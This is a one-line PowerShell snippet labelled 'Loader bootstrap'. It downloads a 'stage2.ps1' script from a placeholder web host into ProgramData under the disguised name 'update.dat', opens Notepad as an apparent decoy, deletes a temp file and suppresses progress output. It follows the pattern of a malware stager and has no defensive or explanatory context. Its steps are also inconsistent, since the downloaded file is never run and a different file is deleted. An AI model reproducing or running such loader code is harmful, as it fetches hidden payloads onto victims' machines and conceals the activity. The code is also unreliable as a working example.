
<# Loader bootstrap #> Invoke-WebRequest -Uri 'http://example.com:80/stage2.ps1' -OutFile "C:\ProgramData\update.dat" -UseBasicParsing; Start-Process -FilePath "notepad.exe"; Remove-Item -Path "$env:TEMP\stage2.bin" -Force; $ProgressPreference = "SilentlyContinue"
